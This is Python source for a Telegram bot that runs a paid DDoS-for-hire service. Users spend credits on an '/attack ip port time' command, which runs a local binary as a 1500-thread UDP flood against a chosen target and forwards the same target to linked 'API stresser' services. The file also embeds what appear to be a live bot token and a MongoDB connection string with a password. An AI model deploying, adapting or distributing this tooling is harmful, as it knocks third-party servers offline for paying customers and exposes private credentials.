import os
import json
import telebot
import requests
import logging
import time
from pymongo import MongoClient
import certifi
from threading import Thread, Lock
import asyncio
from telebot import types
import subprocess

# --- INITIALIZATION ---
attack_loop = asyncio.new_event_loop()
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# --- CONFIGURATION ---
TOKEN = '8754814217:AAEIszWu7k_J3-7qivDV21i4B4i5Bq2bmw4'
MONGO_URI = 'mongodb+srv://ddos62366_db_user:cYaNxOHsNl5mpvA8@cluster0.1bfayzm.mongodb.net/?appName=Cluster0'
PRIMARY_ADMIN = 8318925500 
BINARY_NAME = "./bgmi"

bot = telebot.TeleBot(TOKEN)

# Initialize MongoDB
try:
    client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = client['danger']
    users_collection, api_collection = db.users, db.apis 
    admins_collection, settings_collection = db.admins, db.settings
except Exception as e:
    exit(1)

active_attacks = [] 
attack_lock = Lock()
DEFAULT_THREADS = 1500 

# --- HELPERS ---
def get_user_role(user_id):
    if user_id == PRIMARY_ADMIN: return "owner"
    admin_data = admins_collection.find_one({"user_id": user_id})
    return admin_data.get("role") if admin_data else "user"

def get_settings():
    settings = settings_collection.find_one({"id": "bot_settings"})
    if not settings:
        default = {"id": "bot_settings", "max_time": 300, "total_slots": 8}
        settings_collection.insert_one(default)
        return default
    return settings

def create_inline_keyboard():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("❤️ Join Our Channel", url="https://t.me/+-IX58oAPzeoyODll"))
    markup.add(types.InlineKeyboardButton("👤 Contact Owner", url="https://t.me/Circutowner"))
    return markup

# --- COMMANDS ---

@bot.message_handler(commands=['start', 'help'])
def help_cmd(message):
    help_text = (
        "🌟 *CIRCUT DDOS COMMANDS* 🌟\n\n"
        "🚀 /attack ip port time - Launch\n"
        "📊 /status - Check Accurate Slots\n"
        "👤 /myinfo - Credits Check\n"
        "👑 /maxtime time - Set Limit\n"
        "🎰 /addslot num - Set Slots\n"
        "🤝 /addcredits id amt - Add Credits\n"
        "👤 /addowner id - Add New Owner\n"
        "🔗 /addapi url key - Link API Stresser"
    )
    bot.send_message(message.chat.id, help_text, reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def status_cmd(message):
    setts = get_settings()
    with attack_lock:
        used = len(active_attacks)
    bot.send_message(message.chat.id, f"📊 *ACCURATE STATUS*\n\n🚀 *Active Attacks:* `{used}`\n🎰 *Total Slots:* `{setts['total_slots']}`\n⏱️ *Max Duration:* `{setts['max_time']}s`", parse_mode='Markdown')

@bot.message_handler(commands=['myinfo'])
def myinfo(message):
    data = users_collection.find_one({"user_id": message.from_user.id})
    credits = data.get('credits', 0) if data else 0
    role = get_user_role(message.from_user.id)
    bot.send_message(message.chat.id, f"👤 *Your Info*\n\n💳 *Credits:* `{credits}`\n🎭 *Role:* `{role.upper()}`", parse_mode='Markdown')

# --- ADMIN COMMANDS (ALL WORKING) ---

@bot.message_handler(commands=['maxtime', 'addslot', 'addcredits', 'addowner', 'addapi'])
def admin_handler(message):
    if get_user_role(message.from_user.id) != "owner":
        bot.send_message(message.chat.id, "❌ *Owner permission required!*")
        return
    
    args = message.text.split()
    cmd = args[0].replace("/", "")
    
    try:
        if cmd == 'maxtime':
            settings_collection.update_one({"id": "bot_settings"}, {"$set": {"max_time": int(args[1])}}, upsert=True)
            bot.send_message(message.chat.id, f"✅ Max Time set to: `{args[1]}s`")
            
        elif cmd == 'addslot':
            settings_collection.update_one({"id": "bot_settings"}, {"$set": {"total_slots": int(args[1])}}, upsert=True)
            bot.send_message(message.chat.id, f"✅ Total Slots set to: `{args[1]}`")
            
        elif cmd == 'addcredits':
            users_collection.update_one({"user_id": int(args[1])}, {"$inc": {"credits": int(args[2])}}, upsert=True)
            bot.send_message(message.chat.id, f"✅ Added `{args[2]}` credits to `{args[1]}`")
            
        elif cmd == 'addowner':
            admins_collection.update_one({"user_id": int(args[1])}, {"$set": {"role": "owner"}}, upsert=True)
            bot.send_message(message.chat.id, f"👑 New Owner registered: `{args[1]}`")

        elif cmd == 'addapi':
            api_collection.update_one({"url": args[1]}, {"$set": {"key": args[2]}}, upsert=True)
            bot.send_message(message.chat.id, f"🔗 API Linked: `{args[1]}`")
            
    except:
        bot.send_message(message.chat.id, "⚠️ Syntax Error! Example: `/addcredits 12345 100`")

# --- ATTACK ENGINE ---

async def run_attack_task(chat_id, ip, port, dur, atk_id):
    global active_attacks
    cmd = f"chmod +x {BINARY_NAME} && {BINARY_NAME} {ip} {port} {dur} {DEFAULT_THREADS}"
    
    # Trigger External APIs
    for api in list(api_collection.find()):
        try: requests.get(f"https://{api['url']}/api?key={api['key']}&host={ip}&port={port}&time={dur}", timeout=4)
        except: pass

    try:
        p = subprocess.Popen(cmd, shell=True)
        await asyncio.sleep(dur)
        p.terminate()
    finally:
        with attack_lock:
            if atk_id in active_attacks: active_attacks.remove(atk_id)
        bot.send_message(chat_id, "✅ *ATTACK FINISHED!*", reply_markup=create_inline_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = message.from_user.id
    user_data = users_collection.find_one({"user_id": user_id})
    setts = get_settings()
    
    if not user_data or user_data.get('credits', 0) < 5:
        bot.send_message(message.chat.id, "🚫 *Credits Low!* Need 5 credits.")
        return

    with attack_lock:
        if len(active_attacks) >= setts['total_slots']:
            bot.send_message(message.chat.id, "⚠️ *All Slots Full!* Please wait for someone to finish.")
            return

    args = message.text.split()
    if len(args) != 4:
        bot.send_message(message.chat.id, "❌ Usage: `/attack ip port time`")
        return

    try:
        ip, port, dur = args[1], int(args[2]), int(args[3])
        if dur > setts['max_time']:
            bot.send_message(message.chat.id, f"❌ Max Time Limit is {setts['max_time']}s")
            return

        users_collection.update_one({"user_id": user_id}, {"$inc": {"credits": -5}})
        atk_id = f"{ip}_{port}_{time.time()}"
        
        with attack_lock: 
            active_attacks.append(atk_id) # Slot occupy

        box_msg = (f"```\n╔══════════════════════════════════════╗\n║          ⚡ ATTACK STARTED ⚡         ║\n"
                   f"╠══════════════════════════════════════╣\n║  🎯 Target:  {ip:<23} ║\n║  🔌 Port:    {port:<23} ║\n"
                   f"║  ⏱️ Time:    {dur:<23} ║\n║  🛠️ Method:  UDP Flood               ║\n╚══════════════════════════════════════╝\n```")
        bot.send_message(message.chat.id, box_msg, parse_mode='Markdown')
        asyncio.run_coroutine_threadsafe(run_attack_task(message.chat.id, ip, port, dur, atk_id), attack_loop)
    except: pass

# --- RUNNER ---
def main():
    def start_loop():
        asyncio.set_event_loop(attack_loop)
        attack_loop.run_forever()
    Thread(target=start_loop, daemon=True).start()
    bot.infinity_polling()

if __name__ == "__main__":
    main()

